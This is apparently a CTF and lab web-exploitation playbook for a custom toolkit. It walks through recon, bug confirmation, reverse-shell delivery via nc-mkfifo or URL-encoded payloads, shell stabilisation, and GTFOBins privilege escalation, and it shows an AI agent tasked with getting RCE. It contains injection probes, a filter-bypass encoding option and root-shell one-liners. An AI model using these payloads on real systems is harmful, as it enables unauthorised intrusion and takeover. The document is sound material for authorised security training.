# Web exploitation playbook

A hypothesis-first workflow for CTF/lab web targets, wired to the toolkit's commands.
The loop is always: **fingerprint → discover → hypothesise a bug class → confirm → exploit →
(RCE) → reverse shell**. Automate the first rungs with `ctf-web`; drive the exploit yourself
or with the `ai agent`.

> Authorized targets only (CTF, your own lab, an engagement with scope). `ctf-web` is safe by
> default — it never fires an exploit unless you pass `--rev PORT --fire`.

---

## 0. One command to start

```bash
ctf-web http://TARGET            # interactive: confirms your LHOST, then menu
ctf-web http://TARGET --auto     # straight recon, writes TARGET-work/
ctf-eval http://TARGET           # recon + AI verdict (what's the bug, what next)
```

`ctf-web` runs the whole basic-checks battery and writes `TARGET-work/` (report + per-tool
artifacts + `findings.json`). `ctf-eval` feeds that to the brain for a SOLVED/NEEDS_MORE_WORK
verdict with concrete next steps.

---

## 1. Fingerprint (what am I looking at?)

| Goal | Tool | Note |
|---|---|---|
| Server / framework / versions | `whatweb`, `httpx -td` | banners, X-Powered-By, cookies |
| WAF present? | `wafw00f` | shapes payload encoding later |
| Security posture | headers audit (in `ctf-web`) | missing CSP/HSTS = hints, not bugs |

A framework tells you the likely bug class: Flask/Jinja → SSTI, PHP → LFI/`system()`,
Node → proto-pollution/`child_process`, Java → deserialization/Log4Shell, Rails → mass-assignment.

## 2. Discover (what's exposed?)

- **Content discovery:** `ffuf`/`feroxbuster`/`gobuster` (ctf-web runs one, timeboxed).
- **Sensitive files:** `robots.txt`, `/.git/HEAD` (→ `git-dumper`), `/.env`, backups,
  `/server-status`, `/actuator/*`, `swagger.json`. ctf-web probes these.
- **Parameters:** `arjun` mines hidden params — the injection surface.

## 3. Hypothesise → confirm the bug class

Reach for one targeted request per hypothesis before running a loud scanner. ctf-web's
INJECTION PROBES do the quick confirm for each:

| Bug | Quick confirm | Exploit tool |
|---|---|---|
| **SQLi** | `'` → SQL error; `1 AND 1=1` vs `1=2` | `sqlmap`, manual `requests` |
| **SSTI** | `{{7*7}}`→`49` (Jinja), `${7*7}` (EL) | `SSTImap`, hand-built RCE gadget |
| **Command injection** | `;id` / `$(id)` → `uid=` | manual → **reverse shell** |
| **LFI / traversal** | `../../../../etc/passwd` → `root:` | log poisoning, `php://filter` |
| **Reflected XSS** | marker reflected unencoded | `dalfox` |
| **SSRF** | param fetches your listener | internal port scan, cloud metadata |
| **IDOR / auth** | swap an id, drop a cookie | `requests` session chains |
| **JWT** | `alg:none`, weak secret | `jwt_tool`, PyJWT |
| **Upload / deser** | polyglot, magic bytes; gadget chains | `ysoserial`, phar |

Keep session state with Python `requests` for multi-step chains; fall back to `sqlmap`/`nuclei`
only when a manual hypothesis stalls.

## 4. RCE → reverse shell (the payoff)

Once you have command execution (cmd-injection, SSTI gadget, deserialization, upload):

```bash
# terminal A — catch it (auto-TTY if pwncat-cs is installed, else nc, else python)
ctf-rev listen 4444
```

**Choosing the payload depends on HOW you deliver it.** If you have an interactive
foothold (a shell prompt, an eval box) paste a bash one-liner. If you are injecting
through a **URL / web parameter** (`?cmd=`, SSTI, a blind cmd-injection like Billing's
`icepay.php?democ=`), a raw `bash -i >& /dev/tcp/...` will NOT work — it needs bash
(`/dev/tcp`, `>&`), but injected commands typically run under `/bin/sh` (dash), and the
spaces/`&`/`#` get eaten by the URL. Use an nc-mkfifo payload and URL-encode it:

```bash
# terminal B — WEB delivery (injected through a param): POSIX-safe + URL-encoded
ctf-rev gen --for-web 4444            # nc-mkfifo payload, auto URL-encoded (%20 etc.)
                                      # → paste into the vulnerable param; nc worked on Billing

# terminal B — INTERACTIVE delivery (you already have a shell/eval): pick any one-liner
ctf-rev gen bash 4444                 # or: python3 / php / perl / nc-mkfifo / socat / powershell
ctf-rev gen -a 4444                   # dump every variant, paste whichever the target runs
ctf-rev gen bash 4444 --enc b64       # base64-wrapped to bypass an input filter
ctf-rev gen bash 4444 --enc url       # URL-encode any chosen payload by hand
```

Rule of thumb through a web param: **nc-mkfifo or `python3` beat the bash /dev/tcp
one-liner** — they don't depend on bash and survive a `sh -c` context. Always URL-encode
and start `ctf-rev listen` first.

Or let `ctf-web` stage it automatically on a confirmed cmd-injection (it already
URL-encodes the payload it fires):

```bash
ctf-web 'http://site/ping?ip=127.0.0.1' --auto --rev 4444          # prepare + show payload
ctf-web 'http://site/ping?ip=127.0.0.1' --auto --rev 4444 --fire   # actually inject (listener up!)
```

### Stabilise the shell (do this IMMEDIATELY — a raw nc shell is dumb)

A bare `nc` catch has no prompt, no tab-completion, and Ctrl-C kills the whole session.
Upgrade it to a real PTY the moment you land:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo; fg                    # type `fg` blind, then Enter
export TERM=xterm; stty rows 50 columns 200   # match your window
```

Best fix: use **`pwncat-cs`** as the catcher (`pipx install pwncat-cs`) — it does the TTY
upgrade, history, and file up/download for you. `ctf-rev listen` prefers it automatically
and prints this cheatsheet when it falls back to nc.

## 5. Post-RCE → privilege escalation

Enumerate, read the flag, then escalate if root is needed:

```bash
id; hostname; sudo -n -l           # what can this user run as root without a password?
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
```

Look for creds in configs (`/var/www`, `.env`, DB creds), then privesc with `linpeas`.

**GTFOBins (https://gtfobins.org/gtfobins) is the lookup table for the win.** Whenever
`sudo -l`, a SUID bit, or a capability points at a standard Unix binary, search that binary
on GTFOBins for the exact one-liner that turns it into a root shell / file read / write:

- `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/find` → GTFOBins `find` **Sudo** entry:
  `sudo find . -exec /bin/sh \; -quit` → root shell.
- On **Billing**, `sudo -n -l` = `(ALL) NOPASSWD: /usr/bin/fail2ban-client` → look up
  `fail2ban-client` on GTFOBins for the action-command trick to run code as root.
- SUID `/usr/bin/env` → GTFOBins `env` **SUID** entry: `env /bin/sh -p`.

Workflow: `sudo -l`/SUID/`getcap` → pick a binary → **GTFOBins → Sudo/SUID/Capabilities
section** → paste the one-liner. It's faster and more reliable than guessing.

---

## Cheat sheet

```bash
ctf-web http://T --auto                 # recon → T-work/
ctf-eval http://T                       # recon + AI verdict
ctf-rev listen 4444                      # catch a shell (pwncat > nc > python)
ctf-rev gen --for-web 4444               # injection-safe, URL-encoded (for web params)
ctf-rev gen -a 4444                      # every reverse-shell one-liner for your LHOST:4444
ai agent "confirm the SSTI on http://T and get RCE"   # let the agent drive with tools
```

Privesc after RCE: `sudo -l` / SUID → look the binary up on https://gtfobins.org/gtfobins .
